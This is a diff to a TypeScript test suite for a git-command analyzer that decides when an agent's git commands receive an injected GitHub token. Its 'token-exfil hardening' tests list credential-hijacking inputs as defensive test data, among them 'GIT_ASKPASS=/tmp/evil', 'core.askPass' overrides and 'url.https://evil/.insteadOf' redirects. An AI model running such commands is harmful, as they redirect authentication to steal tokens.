@@ -93,6 +93,12 @@ describe('analyzeGitCommand — inject (explicit url)', () => {
       repoSlug: 'acme/widgets',
     })
   })
+  test('push --repo=url', async () => {
+    expect(await analyze('git push --repo=https://github.com/acme/widgets.git main')).toEqual({
+      kind: 'inject',
+      repoSlug: 'acme/widgets',
+    })
+  })
 })
 
 describe('analyzeGitCommand — inject (remote resolution)', () => {
@@ -182,6 +188,101 @@ describe('analyzeGitCommand — cd rewrite', () => {
   test('cd dir && git -C other blocks (would stack two -C and change cwd)', async () => {
     expect((await analyze('cd workspace/repo && git -C other push origin main', ghRemote)).kind).toBe('block')
   })
+  test('redirection-prefixed git evidence resolves remotes from the cd directory', async () => {
+    const seen: string[] = []
+    const r = resolvers({
+      resolveRemoteUrl: async (cwd) => {
+        seen.push(cwd)
+        return cwd === '/agent/workspace/repo' ? 'https://github.com/acme/widgets.git' : null
+      },
+    })
+
+    const result = await analyze('cd workspace/repo && 2>/tmp/x git push origin main', r)
+    expect(result.kind).toBe('block')
+    expect(seen).toEqual(['/agent/workspace/repo'])
+  })
+  test('redirection-prefixed non-GitHub evidence remains tokenless pass-through from the cd directory', async () => {
+    const seen: string[] = []
+    const r = resolvers({
+      resolveRemoteUrl: async (cwd) => {
+        seen.push(cwd)
+        return cwd === '/agent/workspace/repo'
+          ? 'https://gitlab.com/acme/widgets.git'
+          : 'https://github.com/wrong/base.git'
+      },
+    })
+
+    expect(await analyze('cd workspace/repo && 2>/tmp/x git push origin main', r)).toEqual({
+      kind: 'pass-through',
+    })
+    expect(seen).toEqual(['/agent/workspace/repo'])
+  })
+  test.each([
+    'cd /tmp/repo && cd child && git push origin main',
+    'cd /tmp/repo && (cd child && git push origin main)',
+    'cd /tmp/repo && cd child && (git push origin main)',
+  ])('a simple later cd resolves compound evidence from its derived cwd: %s', async (command) => {
+    const seen: string[] = []
+    const r = resolvers({
+      resolveRemoteUrl: async (cwd) => {
+        seen.push(cwd)
+        return cwd === '/tmp/repo/child' ? 'https://github.com/acme/widgets.git' : 'https://gitlab.com/acme/widgets.git'
+      },
+    })
+
+    expect((await analyze(command, r)).kind).toBe('block')
+    expect(seen).toEqual(['/tmp/repo/child'])
+  })
+  test('a simple later cd whose remote is non-GitHub remains tokenless pass-through', async () => {
+    const seen: string[] = []
+    const r = resolvers({
+      resolveRemoteUrl: async (cwd) => {
+        seen.push(cwd)
+        return cwd === '/tmp/repo/child' ? 'https://gitlab.com/acme/widgets.git' : 'https://github.com/wrong/base.git'
+      },
+    })
+
+    expect(await analyze('cd /tmp/repo && cd child && git push origin main', r)).toEqual({
+      kind: 'pass-through',
+    })
+    expect(seen).toEqual(['/tmp/repo/child'])
+  })
+  test('an ambiguous later cd is ignored and remains tokenless', async () => {
+    expect(
+      await analyze(
+        'cd /tmp/repo && cd "$CHILD" && git push origin main',
+        resolvers({ resolveRemoteUrl: async () => 'https://github.com/acme/widgets.git' }),
+      ),
+    ).toEqual({ kind: 'pass-through' })
+  })
+  test.each([
+    'cd /tmp/repo && git status --short && git push origin main',
+    'cd /tmp/repo && git status --short && 2>/tmp/log git push origin main',
+    'cd /tmp/repo && git status --short && `git push origin main`',
+    'cd /tmp/repo && git push origin main && git status --short',
+    'cd /tmp/repo && git status --short && echo ready && git pull origin main',
+    'cd /tmp/repo && git status --short & git fetch origin',
+    'cd /tmp/repo && git status --short && (git push origin main)',
+    'cd /tmp/repo && git status --short && { git pull origin main; }',
+  ])('cd compound containing a remote git operation blocks with retry guidance: %s', async (command) => {
+    const result = await analyze(command, ghRemote)
+    expect(result.kind).toBe('block')
+    if (result.kind === 'block') {
+      expect(result.reason).toContain('Run local Git commands separately')
+      expect(result.reason).toContain('git -C <path>')
+    }
+  })
+  test('cd compound containing only local git operations passes through', async () => {
+    expect((await analyze('cd /tmp/repo && git status --short && git log --oneline', ghRemote)).kind).toBe(
+      'pass-through',
+    )
+  })
+  test('cd compound targeting a non-GitHub remote passes through', async () => {
+    const gitlabRemote = resolvers({ resolveRemoteUrl: async () => 'https://gitlab.com/acme/widgets.git' })
+    expect((await analyze('cd /tmp/repo && git status --short && git push origin main', gitlabRemote)).kind).toBe(
+      'pass-through',
+    )
+  })
 })
 
 describe('analyzeGitCommand — git -C resolution', () => {
@@ -199,10 +300,10 @@ describe('analyzeGitCommand — git -C resolution', () => {
   })
 })
 
-describe('analyzeGitCommand — config value flag is recognized as the subcommand boundary', () => {
-  test('git -c key=value push is blocked (user -c can redirect auth/destination)', async () => {
+describe('analyzeGitCommand — config value syntax is not mintable', () => {
+  test('git -c key=value push passes through without a token', async () => {
     const r = resolvers({ resolveRemoteUrl: async () => 'https://github.com/acme/widgets.git' })
-    expect((await analyze('git -c credential.helper= push origin main', r)).kind).toBe('block')
+    expect(await analyze('git -c credential.helper= push origin main', r)).toEqual({ kind: 'pass-through' })
   })
 })
 
@@ -309,6 +410,26 @@ describe('analyzeGitCommand — multi-remote resolution', () => {
     expect((await analyze('git fetch --multiple origin bogusgroup', r)).kind).toBe('pass-through')
   })
 
+  test.each(['gitlab', 'null', 'throw'] as const)(
+    'fetch --multiple retains GitHub evidence when another target is %s',
+    async (otherTarget) => {
+      const r = resolvers({
+        resolveRemoteUrl: async (_cwd, remote) => {
+          if (remote === 'origin') return 'https://github.com/acme/widgets.git'
+          if (otherTarget === 'gitlab') return 'https://gitlab.com/acme/widgets.git'
+          if (otherTarget === 'throw') throw new Error('resolver failed')
+          return null
+        },
+      })
+
+      expect((await analyze('git fetch --multiple origin other', r)).kind).toBe('pass-through')
+
+      const compound = await analyze('cd /tmp/repo && git status && git fetch --multiple origin other', r)
+      expect(compound.kind).toBe('block')
+      if (compound.kind === 'block') expect(compound.reason).toContain('git -C <path>')
+    },
+  )
+
   test('an explicit-port ssh URL is not recognized as github (no mint; would bypass https askpass)', async () => {
     expect(parseGithubRepoFromGitUrl('ssh://git@github.com:22/acme/widgets.git')).toBeNull()
     expect(parseGithubRepoFromGitUrl('ssh://git@github.com/acme/widgets.git')).toBe('acme/widgets')
@@ -330,46 +451,109 @@ describe('analyzeGitCommand — multi-remote resolution', () => {
 
 describe('analyzeGitCommand — token-exfil hardening', () => {
   const ghRemote = resolvers({ resolveRemoteUrl: async () => 'https://github.com/acme/widgets.git' })
+  const unmintableCommands = [
+    'git -ccore.askPass=/tmp/evil push origin main',
+    'git -C/tmp/repo push origin main',
+    'git -C',
+    "git -C '' push origin main",
+    'git -c',
+    'git --config-env',
+    'git --git-dir',
+    'git --work-tree',
+    'git --namespace',
+    'git --exec-path',
+    'git push --repo',
+    'git push --repo=',
+    'git push --repository',
+    'git push --unknown origin main',
+    'git push --receive-pack',
+    'git fetch --upload-pack',
+    'git clone --bundle-uri',
+    'git push --receive-pack https://github.com/acme/decoy.git origin',
+    'git fetch --upload-pack https://github.com/acme/decoy.git origin',
+    'git clone --bundle-uri https://github.com/acme/decoy.git https://github.com/acme/widgets.git',
+    'git clone --config',
+    'git clone --config core.askPass=/tmp/evil https://github.com/acme/widgets.git',
+    'git clone --config=core.askPass=/tmp/evil https://github.com/acme/widgets.git',
+  ]
 
-  test('leading env assignment (GIT_ASKPASS override) blocks', async () => {
-    expect((await analyze('GIT_ASKPASS=/tmp/evil git clone https://github.com/acme/widgets.git')).kind).toBe('block')
+  test('leading env assignment (GIT_ASKPASS override) runs tokenless', async () => {
+    expect(await analyze('GIT_ASKPASS=/tmp/evil git clone https://github.com/acme/widgets.git')).toEqual({
+      kind: 'pass-through',
+    })
   })
-  test('git -c url.insteadOf blocks', async () => {
+  test('git -c url.insteadOf runs tokenless', async () => {
     const cmd = 'git -c url.https://evil/.insteadOf=https://github.com/acme/ clone https://github.com/acme/widgets.git'
-    expect((await analyze(cmd)).kind).toBe('block')
+    expect(await analyze(cmd)).toEqual({ kind: 'pass-through' })
   })
-  test('git -c core.askPass blocks', async () => {
-    expect((await analyze('git -c core.askPass=/tmp/evil clone https://github.com/acme/widgets.git')).kind).toBe(
-      'block',
-    )
+  test('git -c core.askPass runs tokenless', async () => {
+    expect(await analyze('git -c core.askPass=/tmp/evil clone https://github.com/acme/widgets.git')).toEqual({
+      kind: 'pass-through',
+    })
   })
-  test('git --config-env (separate arg) blocks', async () => {
-    expect((await analyze('git --config-env core.askPass=EVIL clone https://github.com/acme/widgets.git')).kind).toBe(
-      'block',
-    )
+  test('git --config-env (separate arg) runs tokenless', async () => {
+    expect(await analyze('git --config-env core.askPass=EVIL clone https://github.com/acme/widgets.git')).toEqual({
+      kind: 'pass-through',
+    })
   })
-  test('git --config-env=<name>=<envvar> (inline form) blocks', async () => {
-    expect((await analyze('git --config-env=core.askPass=EVIL clone https://github.com/acme/widgets.git')).kind).toBe(
-      'block',
-    )
+  test('git --config-env=<name>=<envvar> (inline form) runs tokenless', async () => {
+    expect(await analyze('git --config-env=core.askPass=EVIL clone https://github.com/acme/widgets.git')).toEqual({
+      kind: 'pass-through',
+    })
   })
-  test('--git-dir / --work-tree blocks (git operates on a different repo)', async () => {
-    expect((await analyze('git --git-dir=/tmp/o/.git push origin main', ghRemote)).kind).toBe('block')
-    expect((await analyze('git --work-tree=/tmp/o push origin main', ghRemote)).kind).toBe('block')
+  test('--git-dir / --work-tree run tokenless', async () => {
+    expect(await analyze('git --git-dir=/tmp/o/.git push origin main', ghRemote)).toEqual({ kind: 'pass-through' })
+    expect(await analyze('git --work-tree=/tmp/o push origin main', ghRemote)).toEqual({ kind: 'pass-through' })
   })
-  test('--namespace / --exec-path blocks', async () => {
-    expect((await analyze('git --namespace=ns push origin main', ghRemote)).kind).toBe('block')
-    expect((await analyze('git --exec-path=/tmp/x push origin main', ghRemote)).kind).toBe('block')
+  test('--namespace / --exec-path run tokenless', async () => {
+    expect(await analyze('git --namespace=ns push origin main', ghRemote)).toEqual({ kind: 'pass-through' })
+    expect(await analyze('git --exec-path=/tmp/x push origin main', ghRemote)).toEqual({ kind: 'pass-through' })
+  })
+
+  test.each(unmintableCommands)('unknown, attached, or incomplete syntax never injects: %s', async (command) => {
+    expect((await analyze(command, ghRemote)).kind).not.toBe('inject')
+  })
+
+  test.each(unmintableCommands)(
+    'safe-cd does not make unknown, attached, or incomplete syntax mintable: %s',
+    async (gitCommand) => {
+      expect((await analyze(`cd /tmp/repo && ${gitCommand}`, ghRemote)).kind).not.toBe('inject')
+    },
+  )
+})
+
+describe('analyzeGitCommand — grouped tokenless commands', () => {
+  test.each([
+    '(git status --short)',
+    '{ git status --short; }',
+    'git status --short &',
+    'cd /tmp/repo && (git status --short)',
+    'cd /tmp/repo && { git status --short; }',
+    'cd /tmp/repo && git status --short &',
+  ])('local-only group/background passes through: %s', async (command) => {
+    expect(await analyze(command)).toEqual({ kind: 'pass-through' })
+  })
+
+  test.each([
+    '(git push origin main)',
+    '{ git fetch origin; }',
+    'git push origin main &',
+    'cd /tmp/repo && (git push origin main)',
+    'cd /tmp/repo && { git fetch origin; }',
+    'cd /tmp/repo && git push origin main &',
+  ])('non-GitHub group/background passes through: %s', async (command) => {
+    const gitlabRemote = resolvers({ resolveRemoteUrl: async () => 'https://gitlab.com/acme/widgets.git' })
+    expect(await analyze(command, gitlabRemote)).toEqual({ kind: 'pass-through' })
   })
 })
 
 describe('analyzeGitCommand — fetch/pull --all', () => {
   const ghRemote = resolvers({ resolveRemoteUrl: async () => 'https://github.com/acme/widgets.git' })
-  test('fetch --all blocks (cannot enumerate every remote safely)', async () => {
-    expect((await analyze('git fetch --all', ghRemote)).kind).toBe('block')
+  test('fetch --all runs tokenless (not in the positive allowlist)', async () => {
+    expect(await analyze('git fetch --all', ghRemote)).toEqual({ kind: 'pass-through' })
   })
-  test('pull --all blocks', async () => {
-    expect((await analyze('git pull --all', ghRemote)).kind).toBe('block')
+  test('pull --all runs tokenless', async () => {
+    expect(await analyze('git pull --all', ghRemote)).toEqual({ kind: 'pass-through' })
   })
 })
 
@@ -560,6 +744,27 @@ describe('analyzeGitCommand — clone-then-inspect (sanitized re-exec)', () => {
       'block',
     )
   })
+
+  test.each([
+    '</tmp/input git push origin main',
+    'exec git push origin main',
+    'command git push origin main',
+    'env FOO=bar git push origin main',
+    'exec git status --short',
+  ])('clone-tail git behind a narrow prefix rejects the clone-then-inspect rewrite: %s', async (tail) => {
+    const result = await analyze(`git clone https://github.com/acme/widgets.git /tmp/x && ${tail}`, ghRemote)
+    expect(result.kind).toBe('block')
+  })
+
+  test.each(['exec git status --short', 'env FOO=bar git push origin main'])(
+    'non-GitHub clone-tail git behind a narrow prefix remains tokenless: %s',
+    async (tail) => {
+      const gitlabRemote = resolvers({ resolveRemoteUrl: async () => 'https://gitlab.com/acme/widgets.git' })
+      expect(await analyze(`git clone https://gitlab.com/acme/widgets.git /tmp/x && ${tail}`, gitlabRemote)).toEqual({
+        kind: 'pass-through',
+      })
+    },
+  )
 
   test('clone with ; instead of && stays blocked (only && sequences after clone exits)', async () => {
     expect((await analyze('git clone https://github.com/acme/widgets.git /tmp/x; ls')).kind).toBe('block')
